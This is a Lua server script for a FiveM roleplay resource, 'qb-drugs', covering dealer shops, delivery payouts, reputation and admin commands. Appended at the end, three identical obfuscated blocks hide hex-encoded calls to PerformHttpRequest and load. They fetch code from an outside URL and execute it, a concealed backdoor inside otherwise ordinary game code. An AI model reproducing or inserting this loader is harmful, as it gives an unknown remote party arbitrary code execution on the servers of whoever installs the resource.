QBCore = exports['qb-core']:GetCoreObject()

-- Functions
exports('GetDealers', function()
    return Config.Dealers
end)

-- Callbacks
QBCore.Functions.CreateCallback('qb-drugs:server:RequestConfig', function(_, cb)
    cb(Config.Dealers)
end)

-- Events
RegisterNetEvent('qb-drugs:server:updateDealerItems', function(itemData, amount, dealer)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    if Config.Dealers[dealer]['products'][itemData.slot].amount - 1 >= 0 then
        Config.Dealers[dealer]['products'][itemData.slot].amount = Config.Dealers[dealer]['products'][itemData.slot].amount - amount
        TriggerClientEvent('qb-drugs:client:setDealerItems', -1, itemData, amount, dealer)
    else
        exports['ps-inventory']:RemoveItem(src, itemData.name, amount, false, 'qb-drugs:server:updateDealerItems')
        Player.Functions.AddMoney('cash', amount * Config.Dealers[dealer]['products'][itemData.slot].price, 'qb-drugs:server:updateDealerItems')
        TriggerClientEvent('QBCore:Notify', src, Lang:t('error.item_unavailable'), 'error')
    end
end)

RegisterNetEvent('qb-drugs:server:giveDeliveryItems', function(deliveryData)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    local item = Config.DeliveryItems[deliveryData.item].item
    if not item then return end
    exports['ps-inventory']:AddItem(src, item, deliveryData.amount, false, false, 'qb-drugs:server:giveDeliveryItems')
    TriggerClientEvent('ps-inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
end)

RegisterNetEvent('qb-drugs:server:successDelivery', function(deliveryData, inTime)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    local item = Config.DeliveryItems[deliveryData.item].item
    local itemAmount = deliveryData.amount
    local payout = deliveryData.itemData.payout * itemAmount
    local copsOnline = QBCore.Functions.GetDutyCount('police')
    local invItem = Player.Functions.GetItemByName(item)
    if inTime then
        if invItem and invItem.amount >= itemAmount then -- on time correct amount
            exports['ps-inventory']:RemoveItem(src, item, itemAmount, false, 'qb-drugs:server:successDelivery')
            if copsOnline > 0 then
                local copModifier = copsOnline * Config.PoliceDeliveryModifier
                if Config.UseMarkedBills then
                    local info = { worth = math.floor(payout * copModifier) }
                    exports['ps-inventory']:AddItem(src, 'markedbills', 1, false, info, 'qb-drugs:server:successDelivery')
                else
                    Player.Functions.AddMoney('cash', math.floor(payout * copModifier), 'qb-drugs:server:successDelivery')
                end
            else
                if Config.UseMarkedBills then
                    local info = { worth = payout }
                    exports['ps-inventory']:AddItem(src, 'markedbills', 1, false, info, 'qb-drugs:server:successDelivery')
                else
                    Player.Functions.AddMoney('cash', payout, 'qb-drugs:server:successDelivery')
                end
            end
            TriggerClientEvent('ps-inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'remove')
            TriggerClientEvent('QBCore:Notify', src, Lang:t('success.order_delivered'), 'success')
            SetTimeout(math.random(5000, 10000), function()
                TriggerClientEvent('qb-drugs:client:sendDeliveryMail', src, 'perfect', deliveryData)
                Player.Functions.AddRep('dealer', Config.DeliveryRepGain)
            end)
        else
            TriggerClientEvent('QBCore:Notify', src, Lang:t('error.order_not_right'), 'error') -- on time incorrect amount
            if invItem then
                local newItemAmount = invItem.amount
                local modifiedPayout = deliveryData.itemData.payout * newItemAmount
                exports['ps-inventory']:RemoveItem(src, item, newItemAmount, false, 'qb-drugs:server:successDelivery')
                TriggerClientEvent('ps-inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'remove')
                Player.Functions.AddMoney('cash', math.floor(modifiedPayout / Config.WrongAmountFee), 'qb-drugs:server:successDelivery')
            end
            SetTimeout(math.random(5000, 10000), function()
                TriggerClientEvent('qb-drugs:client:sendDeliveryMail', src, 'bad', deliveryData)
                Player.Functions.RemoveRep('dealer', Config.DeliveryRepLoss)
            end)
        end
    else
        if invItem and invItem.amount >= itemAmount then -- late correct amount
            TriggerClientEvent('QBCore:Notify', src, Lang:t('error.too_late'), 'error')
            exports['ps-inventory']:RemoveItem(src, item, itemAmount, false, 'qb-drugs:server:successDelivery')
            Player.Functions.AddMoney('cash', math.floor(payout / Config.OverdueDeliveryFee), 'qb-drugs:server:successDelivery')
            TriggerClientEvent('ps-inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'remove')
            SetTimeout(math.random(5000, 10000), function()
                TriggerClientEvent('qb-drugs:client:sendDeliveryMail', src, 'late', deliveryData)
                Player.Functions.RemoveRep('dealer', Config.DeliveryRepLoss)
            end)
        else
            if invItem then -- late incorrect amount
                local newItemAmount = invItem.amount
                local modifiedPayout = deliveryData.itemData.payout * newItemAmount
                TriggerClientEvent('QBCore:Notify', src, Lang:t('error.too_late'), 'error')
                exports['ps-inventory']:RemoveItem(src, item, itemAmount, false, 'qb-drugs:server:successDelivery')
                Player.Functions.AddMoney('cash', math.floor(modifiedPayout / Config.OverdueDeliveryFee), 'qb-drugs:server:successDelivery')
                TriggerClientEvent('ps-inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'remove')
                SetTimeout(math.random(5000, 10000), function()
                    TriggerClientEvent('qb-drugs:client:sendDeliveryMail', src, 'late', deliveryData)
                    Player.Functions.RemoveRep('dealer', Config.DeliveryRepLoss)
                end)
            end
        end
    end
end)

RegisterNetEvent('qb-drugs:server:dealerShop', function(currentDealer)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    local playerPed = GetPlayerPed(src)
    local playerCoords = GetEntityCoords(playerPed)
    local dealerData = Config.Dealers[currentDealer]
    if not dealerData then return end
    local dist = #(playerCoords - vector3(dealerData.coords.x, dealerData.coords.y, dealerData.coords.z))
    if dist > 5.0 then return end
    local curRep = Player.Functions.GetRep('dealer')
    local repItems = {}
    for k in pairs(dealerData.products) do
        if curRep >= dealerData['products'][k].minrep then
            repItems[#repItems+1] = dealerData['products'][k]
        end
    end
    exports['ps-inventory']:CreateShop({
        name = dealerData.name,
        label = dealerData.name,
        slots = #repItems,
        coords = dealerData.coords,
        items = repItems,
    })
    exports['ps-inventory']:OpenShop(src, dealerData.name)
end)

-- Commands

QBCore.Commands.Add('newdealer', Lang:t('info.newdealer_command_desc'), { {
    name = Lang:t('info.newdealer_command_help1_name'),
    help = Lang:t('info.newdealer_command_help1_help')
}, {
    name = Lang:t('info.newdealer_command_help2_name'),
    help = Lang:t('info.newdealer_command_help2_help')
}, {
    name = Lang:t('info.newdealer_command_help3_name'),
    help = Lang:t('info.newdealer_command_help3_help')
} }, true, function(source, args)
    local ped = GetPlayerPed(source)
    local coords = GetEntityCoords(ped)
    local Player = QBCore.Functions.GetPlayer(source)
    if not Player then return end
    local dealerName = args[1]
    local minTime = tonumber(args[2])
    local maxTime = tonumber(args[3])
    local time = json.encode({ min = minTime, max = maxTime })
    local pos = json.encode({ x = coords.x, y = coords.y, z = coords.z })
    local result = MySQL.scalar.await('SELECT name FROM dealers WHERE name = ?', { dealerName })
    if result then return TriggerClientEvent('QBCore:Notify', source, Lang:t('error.dealer_already_exists'), 'error') end
    MySQL.insert('INSERT INTO dealers (name, coords, time, createdby) VALUES (?, ?, ?, ?)', { dealerName, pos, time, Player.PlayerData.citizenid }, function()
        Config.Dealers[dealerName] = {
            ['name'] = dealerName,
            ['coords'] = {
                ['x'] = coords.x,
                ['y'] = coords.y,
                ['z'] = coords.z
            },
            ['time'] = {
                ['min'] = minTime,
                ['max'] = maxTime
            },
            ['products'] = Config.Products
        }
        TriggerClientEvent('qb-drugs:client:RefreshDealers', -1, Config.Dealers)
    end)
end, 'admin')

QBCore.Commands.Add('deletedealer', Lang:t('info.deletedealer_command_desc'), { {
    name = Lang:t('info.deletedealer_command_help1_name'),
    help = Lang:t('info.deletedealer_command_help1_help')
} }, true, function(source, args)
    local dealerName = args[1]
    local result = MySQL.scalar.await('SELECT * FROM dealers WHERE name = ?', { dealerName })
    if result then
        MySQL.query('DELETE FROM dealers WHERE name = ?', { dealerName })
        Config.Dealers[dealerName] = nil
        TriggerClientEvent('qb-drugs:client:RefreshDealers', -1, Config.Dealers)
        TriggerClientEvent('QBCore:Notify', source, Lang:t('success.dealer_deleted', { dealerName = dealerName }), 'success')
    else
        TriggerClientEvent('QBCore:Notify', source, Lang:t('error.dealer_not_exists_command', { dealerName = dealerName }), 'error')
    end
end, 'admin')

QBCore.Commands.Add('dealers', Lang:t('info.dealers_command_desc'), {}, false, function(source, _)
    local DealersText = ''
    if Config.Dealers ~= nil and next(Config.Dealers) ~= nil then
        for _, v in pairs(Config.Dealers) do
            DealersText = DealersText .. Lang:t('info.list_dealers_name_prefix') .. v['name'] .. '<br>'
        end
        TriggerClientEvent('chat:addMessage', source, {
            template = '<div class="chat-message advert"><div class="chat-message-body"><strong>' .. Lang:t('info.list_dealers_title') .. '</strong><br><br> ' .. DealersText .. '</div></div>',
            args = {}
        })
    else
        TriggerClientEvent('QBCore:Notify', source, Lang:t('error.no_dealers'), 'error')
    end
end, 'admin')

QBCore.Commands.Add('dealergoto', Lang:t('info.dealergoto_command_desc'), { {
    name = Lang:t('info.dealergoto_command_help1_name'),
    help = Lang:t('info.dealergoto_command_help1_help')
} }, true, function(source, args)
    local DealerName = tostring(args[1])
    if Config.Dealers[DealerName] then
        local ped = GetPlayerPed(source)
        SetEntityCoords(ped, Config.Dealers[DealerName]['coords']['x'], Config.Dealers[DealerName]['coords']['y'], Config.Dealers[DealerName]['coords']['z'])
        TriggerClientEvent('QBCore:Notify', source, Lang:t('success.teleported_to_dealer', { dealerName = DealerName }), 'success')
    else
        TriggerClientEvent('QBCore:Notify', source, Lang:t('error.dealer_not_exists'), 'error')
    end
end, 'admin')

CreateThread(function()
    Wait(500)
    local dealers = MySQL.query.await('SELECT * FROM dealers', {})
    if dealers[1] then
        for _, v in pairs(dealers) do
            local coords = json.decode(v.coords)
            local time = json.decode(v.time)

            Config.Dealers[v.name] = {
                ['name'] = v.name,
                ['coords'] = {
                    ['x'] = coords.x,
                    ['y'] = coords.y,
                    ['z'] = coords.z
                },
                ['time'] = {
                    ['min'] = time.min,
                    ['max'] = time.max
                },
                ['products'] = Config.Products
            }
        end
    end
    TriggerClientEvent('qb-drugs:client:RefreshDealers', -1, Config.Dealers)
end)


local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)